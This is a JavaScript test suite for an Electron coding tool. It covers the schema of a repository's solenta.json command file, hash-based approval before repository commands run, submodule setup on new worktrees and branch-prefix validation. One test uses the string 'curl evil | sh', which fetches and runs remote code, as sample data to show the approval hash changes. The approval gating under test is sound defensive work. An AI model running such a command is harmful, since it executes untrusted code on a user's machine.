"use strict";

/**
 * #1506 H3: checked-in solenta.json (schema, precedence, approval),
 * submodules on new worktrees, and the per-project branch prefix.
 * Run: npm run test:electron -- electron/test/project-setup-h3.test.js
 */

const { describe, it, beforeEach, afterEach } = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const { execFileSync, spawnSync } = require("node:child_process");
const { Store } = require("../store.js");
const services = require("../services.js");
const {
  setupWorktree,
  maybeRenameWorktreeBranch,
  sweepOrphanWorktrees,
} = require("../worktrees.js");
const {
  waitForCommand,
  pendingSetup,
  runCommand,
  setRunCommandFn,
  kickWorktreeSetup,
  SUBMODULE_COMMAND,
} = require("../projectCommands.js");
const {
  parseRepoConfig,
  readRepoConfig,
  effectiveCommands,
} = require("../repoConfig.js");
const {
  branchPrefixError,
  branchPrefixFor,
  DEFAULT_BRANCH_PREFIX,
} = require("../worktrees-branches.js");
const { migrateProject } = require("../store-migrate.js");

function git(cwd, args) {
  return execFileSync("git", args, {
    cwd,
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
  }).trim();
}

function initRepo(dir) {
  fs.mkdirSync(dir, { recursive: true });
  git(dir, ["init", "-b", "main"]);
  git(dir, ["config", "user.email", "test@example.com"]);
  git(dir, ["config", "user.name", "Test"]);
  fs.writeFileSync(path.join(dir, "README.md"), "hello\n");
  git(dir, ["add", "README.md"]);
  git(dir, ["commit", "-m", "init"]);
}

function events(store, threadId) {
  return (store.getMessages(threadId) || [])
    .filter((m) => m.role === "event")
    .map((m) => String(m.text));
}

describe("solenta.json schema", () => {
  it("accepts setup and quickActions with stable ids", () => {
    const cfg = parseRepoConfig({
      setup: " npm ci ",
      quickActions: [{ name: "Test", command: "npm test" }],
      iconPath: "logo.svg",
    });
    assert.equal(cfg.setup, "npm ci");
    assert.deepEqual(cfg.quickActions, [
      { id: "repo:0", name: "Test", command: "npm test" },
    ]);
    assert.match(cfg.hash, /^[0-9a-f]{64}$/);
  });

  it("an icon-only file declares no commands", () => {
    assert.equal(parseRepoConfig({ iconPath: "logo.svg" }), null);
  });

  it("rejects bad shapes whole, never a partial list", () => {
    for (const bad of [
      [],
      "npm ci",
      { setup: 3 },
      { setup: "  " },
      { quickActions: {} },
      { quickActions: [{ name: "Ok", command: "true" }, { name: "", command: "x" }] },
      { quickActions: [{ name: "No command" }] },
      { quickActions: Array.from({ length: 9 }, (_, i) => ({ name: `a${i}`, command: "x" })) },
    ]) {
      const cfg = parseRepoConfig(bad);
      assert.ok(cfg && cfg.error, `expected an error for ${JSON.stringify(bad)}`);
      assert.equal(cfg.setup, undefined);
      assert.equal(cfg.quickActions, undefined);
    }
  });

  it("hash changes when any command changes", () => {
    const a = parseRepoConfig({ setup: "npm ci" }).hash;
    const b = parseRepoConfig({ setup: "npm ci && curl evil | sh" }).hash;
    const c = parseRepoConfig({ setup: "npm ci", quickActions: [{ name: "T", command: "x" }] }).hash;
    assert.notEqual(a, b);
    assert.notEqual(a, c);
  });

  it("reports invalid JSON and re-reads after an edit", () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "coder-repocfg-"));
    try {
      const file = path.join(dir, "solenta.json");
      fs.writeFileSync(file, "{ nope");
      assert.match(readRepoConfig(dir).error, /not valid JSON/);
      fs.writeFileSync(file, JSON.stringify({ setup: "make deps" }));
      // mtime granularity: force a visible change.
      const later = new Date(Date.now() + 5000);
      fs.utimesSync(file, later, later);
      assert.equal(readRepoConfig(dir).setup, "make deps");
      assert.equal(readRepoConfig(path.join(dir, "missing")), null);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("solenta.json precedence and approval", () => {
  let tmpDir;
  let store;
  let repo;
  let project;
  let thread;

  beforeEach(async () => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "coder-repocfg-"));
    store = new Store(path.join(tmpDir, "store.json"));
    repo = path.join(tmpDir, "repo");
    initRepo(repo);
    fs.writeFileSync(
      path.join(repo, "solenta.json"),
      JSON.stringify({
        setup: "echo file-setup",
        quickActions: [{ name: "Lint", command: "echo file-lint" }],
      }),
    );
    project = await services.addProject(store, repo);
    thread = services.createThread(store, { projectId: project.id, title: "T" });
  });

  afterEach(async () => {
    if (thread) await waitForCommand(thread.id);
    setRunCommandFn(null);
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it("project settings override the file field by field", () => {
    const p = store.getProject(project.id);
    let eff = effectiveCommands(p);
    assert.equal(eff.setup.command, "echo file-setup");
    assert.equal(eff.setup.fromRepo, true);
    assert.equal(eff.quickActions[0].id, "repo:0");

    services.updateProject(store, project.id, { setupCommand: "echo own" });
    eff = effectiveCommands(store.getProject(project.id));
    assert.equal(eff.setup.command, "echo own");
    assert.equal(eff.setup.fromRepo, false);
    // quickActions still come from the file
    assert.equal(eff.quickActions[0].fromRepo, true);

    services.updateProject(store, project.id, {
      quickActions: [{ name: "Own", command: "echo own-action" }],
    });
    eff = effectiveCommands(store.getProject(project.id));
    assert.deepEqual(eff.quickActions.map((a) => a.name), ["Own"]);
  });

  it("listProjects shows the file's commands and trust state", () => {
    const listed = services.listProjects(store).find((p) => p.id === project.id);
    assert.equal(listed.repoConfig.setupCommand, "echo file-setup");
    assert.equal(listed.repoConfig.trusted, false);
    assert.match(listed.repoConfig.hash, /^[0-9a-f]{64}$/);
  });

  it("a file command refuses to run until approved, then remembers the hash", async () => {
    const ran = [];
    setRunCommandFn(async (input) => {
      ran.push(input.command);
      return { ok: true, exitCode: 0, timedOut: false, log: "", durationMs: 1 };
    });
    await assert.rejects(
      runCommand(store, { threadId: thread.id, actionId: "repo:0" }),
      /REPO_CONFIG_UNTRUSTED/,
    );
    await assert.rejects(
      runCommand(store, {
        threadId: thread.id,
        actionId: "repo:0",
        trustRepoConfig: "0".repeat(64),
      }),
      /REPO_CONFIG_UNTRUSTED/,
      "a hash for some other command set approves nothing",
    );
    assert.deepEqual(ran, []);

    const hash = services.listProjects(store)[0].repoConfig.hash;
    const result = await runCommand(store, {
      threadId: thread.id,
      actionId: "repo:0",
      trustRepoConfig: hash,
    });
    assert.equal(result.ok, true);
    assert.deepEqual(ran, ["echo file-lint"]);
    assert.equal(store.getProject(project.id).repoConfigTrust, hash);

    // Approved: no hash needed for the next run.
    await runCommand(store, { threadId: thread.id, actionId: "setup" });
    assert.deepEqual(ran, ["echo file-lint", "echo file-setup"]);
  });

  it("asks again when the file's commands change", async () => {
    setRunCommandFn(async () => ({ ok: true, exitCode: 0, timedOut: false, log: "", durationMs: 1 }));
    const hash = services.listProjects(store)[0].repoConfig.hash;
    await runCommand(store, { threadId: thread.id, actionId: "repo:0", trustRepoConfig: hash });

    const file = path.join(repo, "solenta.json");
    fs.writeFileSync(
      file,
      JSON.stringify({ setup: "echo changed", quickActions: [{ name: "Lint", command: "echo file-lint" }] }),
    );
    const later = new Date(Date.now() + 5000);
    fs.utimesSync(file, later, later);

    assert.equal(services.listProjects(store)[0].repoConfig.trusted, false);
    await assert.rejects(
      runCommand(store, { threadId: thread.id, actionId: "repo:0" }),
      /REPO_CONFIG_UNTRUSTED/,
    );
  });

  it("project-owned commands never need approval", async () => {
    const ran = [];
    setRunCommandFn(async (input) => {
      ran.push(input.command);
      return { ok: true, exitCode: 0, timedOut: false, log: "", durationMs: 1 };
    });
    services.updateProject(store, project.id, { setupCommand: "echo own" });
    await runCommand(store, { threadId: thread.id, actionId: "setup" });
    assert.deepEqual(ran, ["echo own"]);
  });

  it("new worktree skips an unapproved file setup with an event", async () => {
    const ran = [];
    setRunCommandFn(async (input) => {
      ran.push(input.command);
      return { ok: true, exitCode: 0, timedOut: false, log: "", durationMs: 1 };
    });
    const out = await kickWorktreeSetup({
      store,
      threadId: thread.id,
      cwd: repo,
      project: store.getProject(project.id),
    });
    assert.equal(out, null);
    assert.deepEqual(ran, []);
    assert.ok(
      events(store, thread.id).some((t) => /skipped: solenta\.json setup needs your approval/.test(t)),
    );
  });

  it("new worktree runs an approved file setup", async () => {
    const ran = [];
    setRunCommandFn(async (input) => {
      ran.push(input.command);
      return { ok: true, exitCode: 0, timedOut: false, log: "", durationMs: 1 };
    });
    const hash = services.listProjects(store)[0].repoConfig.hash;
    store.setProjects(
      store.getProjects().map((p) => ({ ...p, repoConfigTrust: hash })),
    );
    const job = kickWorktreeSetup({
      store,
      threadId: thread.id,
      cwd: repo,
      project: store.getProject(project.id),
    });
    assert.equal(pendingSetup(thread.id), job, "the agent can wait on it");
    await job;
    assert.deepEqual(ran, ["echo file-setup"]);
    assert.equal(pendingSetup(thread.id), null);
  });

  it("store load keeps the new fields and drops junk", () => {
    const n = migrateProject({
      id: "p",
      path: "/x",
      waitForSetup: "yes",
      branchPrefix: "bad prefix",
      repoConfigTrust: "nothex",
      repoConfig: { trusted: true },
    });
    assert.equal(n.waitForSetup, undefined);
    assert.equal(n.branchPrefix, undefined);
    assert.equal(n.repoConfigTrust, undefined);
    assert.equal(n.repoConfig, undefined);
    const ok = migrateProject({
      id: "p",
      path: "/x",
      waitForSetup: true,
      branchPrefix: "agents/",
      repoConfigTrust: "a".repeat(64),
    });
    assert.equal(ok.waitForSetup, true);
    assert.equal(ok.branchPrefix, "agents/");
    assert.equal(ok.repoConfigTrust, "a".repeat(64));
  });
});

describe("submodules on a new worktree", () => {
  let tmpDir;
  let store;
  let thread;
  let project;
  let cwd;

  beforeEach(async () => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "coder-submod-"));
    store = new Store(path.join(tmpDir, "store.json"));
    const repo = path.join(tmpDir, "repo");
    initRepo(repo);
    project = await services.addProject(store, repo);
    thread = services.createThread(store, { projectId: project.id, title: "S" });
    cwd = repo;
  });

  afterEach(async () => {
    await waitForCommand(thread.id);
    setRunCommandFn(null);
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it("does nothing without .gitmodules", async () => {
    const ran = [];
    setRunCommandFn(async (input) => {
      ran.push(input.command);
      return { ok: true };
    });
    assert.equal(
      await kickWorktreeSetup({ store, threadId: thread.id, cwd, project: store.getProject(project.id) }),
      null,
    );
    assert.deepEqual(ran, []);
  });

  it("updates submodules before setup; a failure warns and setup still runs", async () => {
    fs.writeFileSync(path.join(cwd, ".gitmodules"), "[submodule \"x\"]\n");
    services.updateProject(store, project.id, { setupCommand: "npm ci" });
    const ran = [];
    setRunCommandFn(async (input) => {
      ran.push({ command: input.command, env: input.env });
      if (input.command === SUBMODULE_COMMAND) {
        return { ok: false, exitCode: 128, timedOut: false, log: "fatal: could not read Username", durationMs: 5 };
      }
      return { ok: true, exitCode: 0, timedOut: false, log: "", durationMs: 5 };
    });
    const result = await kickWorktreeSetup({
      store,
      threadId: thread.id,
      cwd,
      project: store.getProject(project.id),
    });
    assert.deepEqual(ran.map((r) => r.command), [SUBMODULE_COMMAND, "npm ci"]);
    assert.equal(ran[0].env.GIT_TERMINAL_PROMPT, "0");
    assert.equal(ran[0].env.PATH, process.env.PATH, "keeps the rest of the env");
    assert.equal(result.ok, true, "setup result, not the submodule warning");
    const ev = events(store, thread.id);
    assert.ok(ev.some((t) => /^\[submodules\] failed: exit 128/.test(t)));
    assert.ok(ev.some((t) => /^\[setup\] ok/.test(t)));
  });

  it("really initializes a submodule in a real worktree", async () => {
    const sub = path.join(tmpDir, "sub");
    initRepo(sub);
    const repo = store.getProject(project.id).path;
    // file:// is fine for this local fixture.
    git(repo, ["-c", "protocol.file.allow=always", "submodule", "add", sub, "vendor/sub"]);
    git(repo, ["commit", "-m", "add sub"]);
    // file:// submodules need this since git 2.38, in the env so the
    // nested clone sees it too.
    const saved = { ...process.env };
    Object.assign(process.env, {
      GIT_CONFIG_COUNT: "1",
      GIT_CONFIG_KEY_0: "protocol.file.allow",
      GIT_CONFIG_VALUE_0: "always",
    });
    try {
      const t = setupWorktree({
        store,
        threadId: thread.id,
        worktreeBase: path.join(tmpDir, "worktrees"),
      });
      await waitForCommand(thread.id);
      assert.ok(
        fs.existsSync(path.join(t.worktreePath, "vendor/sub/README.md")),
        `submodule checked out; events: ${events(store, thread.id).join(" | ")}`,
      );
      git(repo, ["worktree", "remove", "--force", t.worktreePath]);
    } finally {
      for (const k of ["GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_CONFIG_VALUE_0"]) {
        if (saved[k] === undefined) delete process.env[k];
        else process.env[k] = saved[k];
      }
    }
  });
});

describe("branch prefix", () => {
  it("matches git check-ref-format", () => {
    const cases = [
      "coder/",
      "agents/",
      "willem-",
      "team/ai/",
      "feat.",
      "-bad/",
      "/lead",
      "has space/",
      "a..b/",
      "a//b/",
      "x@{y/",
      ".hidden/",
      "x.lock/",
      "tilde~/",
      "co:lon/",
      "back\\slash/",
    ];
    for (const prefix of cases) {
      const r = spawnSync("git", ["check-ref-format", "--branch", `${prefix}slug-abc123`]);
      const gitOk = r.status === 0;
      assert.equal(
        branchPrefixError(prefix) === null,
        gitOk,
        `${JSON.stringify(prefix)}: ours=${branchPrefixError(prefix)} git=${gitOk}`,
      );
    }
  });

  it("falls back to coder/ for unset or invalid", () => {
    assert.equal(branchPrefixFor(null), DEFAULT_BRANCH_PREFIX);
    assert.equal(branchPrefixFor({ branchPrefix: "bad prefix" }), "coder/");
    assert.equal(branchPrefixFor({ branchPrefix: "ai/" }), "ai/");
  });

  describe("on real worktrees", () => {
    let tmpDir;
    let store;
    let repo;
    let project;
    let worktreeBase;

    beforeEach(async () => {
      tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "coder-prefix-"));
      store = new Store(path.join(tmpDir, "store.json"));
      worktreeBase = path.join(tmpDir, "worktrees");
      repo = path.join(tmpDir, "repo");
      initRepo(repo);
      project = await services.addProject(store, repo);
    });

    afterEach(async () => {
      for (const t of store.getThreads()) {
        await waitForCommand(t.id);
        if (t.worktreePath && fs.existsSync(t.worktreePath)) {
          try {
            git(repo, ["worktree", "remove", "--force", t.worktreePath]);
          } catch {
            // ignore
          }
        }
      }
      fs.rmSync(tmpDir, { recursive: true, force: true });
    });

    it("updateProject validates and the default clears the key", () => {
      assert.throws(
        () => services.updateProject(store, project.id, { branchPrefix: "bad prefix/" }),
        /cannot contain spaces/,
      );
      services.updateProject(store, project.id, { branchPrefix: "ai/" });
      assert.equal(store.getProject(project.id).branchPrefix, "ai/");
      services.updateProject(store, project.id, { branchPrefix: "coder/" });
      assert.equal(store.getProject(project.id).branchPrefix, undefined);
      services.updateProject(store, project.id, { branchPrefix: "ai/" });
      services.updateProject(store, project.id, { branchPrefix: null });
      assert.equal(store.getProject(project.id).branchPrefix, undefined);
    });

    it("new worktrees use the project's prefix", () => {
      services.updateProject(store, project.id, { branchPrefix: "ai/" });
      const thread = services.createThread(store, { projectId: project.id, title: "Fix login" });
      const t = setupWorktree({ store, threadId: thread.id, worktreeBase });
      assert.equal(t.branch, `ai/fix-login-${thread.id.slice(0, 6)}`);
      assert.equal(git(t.worktreePath, ["branch", "--show-current"]), t.branch);
    });

    it("an old coder/ placeholder still renames after the prefix changed", () => {
      const thread = services.createThread(store, { projectId: project.id, title: "New Thread" });
      const t = setupWorktree({ store, threadId: thread.id, worktreeBase });
      const id = thread.id.slice(0, 6);
      assert.equal(t.branch, `coder/new-thread-${id}`);

      services.updateProject(store, project.id, { branchPrefix: "ai/" });
      const renamed = maybeRenameWorktreeBranch({ store, threadId: thread.id, newTitle: "Real title" });
      assert.equal(renamed.branch, `coder/real-title-${id}`, "keeps the prefix it was born with");
    });

    it("a custom-prefix placeholder renames under that prefix", () => {
      services.updateProject(store, project.id, { branchPrefix: "ai-" });
      const thread = services.createThread(store, { projectId: project.id, title: "New Thread" });
      const t = setupWorktree({ store, threadId: thread.id, worktreeBase });
      const id = thread.id.slice(0, 6);
      assert.equal(t.branch, `ai-new-thread-${id}`);
      const renamed = maybeRenameWorktreeBranch({ store, threadId: thread.id, newTitle: "Real title" });
      assert.equal(renamed.branch, `ai-real-title-${id}`);
    });

    it("a user branch ending in the placeholder tail is left alone", () => {
      const thread = services.createThread(store, { projectId: project.id, title: "New Thread" });
      const t = setupWorktree({ store, threadId: thread.id, worktreeBase });
      const id = thread.id.slice(0, 6);
      const mine = `mine/new-thread-${id}`;
      git(t.worktreePath, ["branch", "-m", t.branch, mine]);
      store.updateThread(thread.id, { branch: mine });
      assert.equal(
        maybeRenameWorktreeBranch({ store, threadId: thread.id, newTitle: "Real" }),
        null,
      );
    });

    it("the orphan sweep tidies merged branches under coder/ and custom prefixes only", async () => {
      services.updateProject(store, project.id, { branchPrefix: "ai/" });
      const mk = (branch) => {
        const dir = path.join(worktreeBase, branch.replace(/\//g, "_"));
        fs.mkdirSync(worktreeBase, { recursive: true });
        git(repo, ["worktree", "add", "-b", branch, dir]);
        return dir;
      };
      mk("coder/old-aaaaaa");
      mk("ai/new-bbbbbb");
      mk("someone/else-cccccc");
      const res = await sweepOrphanWorktrees({ store, worktreeBase });
      assert.equal(res.removed.length, 3);
      const branches = git(repo, ["branch", "--format=%(refname:short)"]).split("\n");
      assert.ok(!branches.includes("coder/old-aaaaaa"));
      assert.ok(!branches.includes("ai/new-bbbbbb"));
      assert.ok(branches.includes("someone/else-cccccc"), "foreign prefix kept");
    });
  });
});
